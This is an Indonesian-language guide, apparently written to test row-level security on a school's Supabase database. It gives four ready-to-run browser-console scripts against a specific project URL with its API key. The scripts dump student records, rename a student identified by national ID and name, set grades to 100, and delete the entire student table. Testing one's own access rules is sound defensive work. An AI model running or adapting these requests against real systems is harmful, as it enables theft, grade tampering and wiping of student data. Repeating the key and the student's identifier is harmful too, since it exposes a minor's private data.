# Perintah Uji Coba Celah Keamanan (Hacking Simulation)

Gunakan perintah-perintah JavaScript di bawah ini langsung di **Console Developer Tools (F12)** browser Anda untuk memverifikasi tingkat keamanan database sebelum dan sesudah RLS dikunci.

---

### 1. Mengambil (Dump) Data Siswa secara Anonim
Perintah ini mencoba menarik data siswa secara massal tanpa hak akses login.

```javascript
fetch('https://ngdepacckohoxemlauhd.supabase.co/rest/v1/siswa_permanent?select=*&limit=5', {
  headers: {
    'apikey': 'sb_publishable_HShpzptZQ6jymnZO-zrgrQ_4PPx_DYV',
    'Authorization': 'Bearer sb_publishable_HShpzptZQ6jymnZO-zrgrQ_4PPx_DYV'
  }
})
.then(response => response.json())
.then(data => {
  console.log("=== HASIL BACA DATA SISWA ===");
  console.table(data);
})
.catch(err => console.error("Error:", err));
```
* **Sebelum RLS dikunci:** Berhasil menampilkan tabel berisi biodata lengkap siswa.
* **Setelah RLS dikunci:** Mengembalikan array kosong `[]` atau error *401/403* (Aman).

---

### 2. Mengubah (Edit) Data Siswa Lain secara Anonim
Perintah ini mensimulasikan siswa yang usil mencoba mengubah nama siswa lain (misal siswa dengan NISN `0131121177` / Chloe Euginia). 
```javascript
fetch('https://ngdepacckohoxemlauhd.supabase.co/rest/v1/siswa_permanent?nisn=eq.0131121177', {
  method: 'PATCH',
  headers: {
    'apikey': 'sb_publishable_HShpzptZQ6jymnZO-zrgrQ_4PPx_DYV',
    'Authorization': 'Bearer sb_publishable_HShpzptZQ6jymnZO-zrgrQ_4PPx_DYV',
    'Content-Type': 'application/json',
    'Prefer': 'return=representation'
  },
  body: JSON.stringify({
    nama_lengkap: 'Hacked By Siswa Iseng'
  })
})
.then(response => response.json())
.then(data => {
  console.log("=== HASIL EDIT DATA SISWA ===");
  console.log(data);
})
.catch(err => console.error("Error:", err));
```
* **Sebelum RLS dikunci:** Berhasil mengubah nama Chloe di database.
* **Setelah RLS dikunci:** Gagal mengubah nama Chloe (Aman).

---

### 3. Mengubah Nilai Siswa Lain secara Anonim
Perintah ini mensimulasikan siswa yang mencoba memanipulasi nilainya sendiri atau temannya menjadi 100.

```javascript
fetch('https://ngdepacckohoxemlauhd.supabase.co/rest/v1/nilai_siswa?siswa_nisn=eq.0131121177', {
  method: 'PATCH',
  headers: {
    'apikey': 'sb_publishable_HShpzptZQ6jymnZO-zrgrQ_4PPx_DYV',
    'Authorization': 'Bearer sb_publishable_HShpzptZQ6jymnZO-zrgrQ_4PPx_DYV',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    nilai: 100
  })
})
.then(response => {
  console.log("=== HASIL MANIPULASI NILAI ===");
  if (response.ok) {
    console.log("Nilai berhasil diubah menjadi 100!");
  } else {
    console.log("Gagal memanipulasi nilai:", response.statusText);
  }
})
.catch(err => console.error("Error:", err));
```
* **Sebelum RLS dikunci:** Berhasil mengubah nilai di database.
* **Setelah RLS dikunci:** Gagal melakukan perubahan (Aman).

---

### 4. Menghapus Seluruh Tabel Siswa secara Anonim (Data Wiping)
Perintah berbahaya ini mencoba menghapus seluruh data siswa di database SMP Budi Mulia.

```javascript
fetch('https://ngdepacckohoxemlauhd.supabase.co/rest/v1/siswa_permanent', {
  method: 'DELETE',
  headers: {
    'apikey': 'sb_publishable_HShpzptZQ6jymnZO-zrgrQ_4PPx_DYV',
    'Authorization': 'Bearer sb_publishable_HShpzptZQ6jymnZO-zrgrQ_4PPx_DYV'
  }
})
.then(response => {
  console.log("=== HASIL MENGHAPUS SEMUA DATA ===");
  if (response.ok) {
    console.log("Waspada: Seluruh data siswa berhasil DIHAPUS!");
  } else {
    console.log("Aman: Penghapusan massal ditolak!", response.statusText);
  }
})
.catch(err => console.error("Error:", err));
```
* **Sebelum RLS dikunci:** Data siswa akan terhapus massal!
* **Setelah RLS dikunci:** Aksi ditolak (Aman).
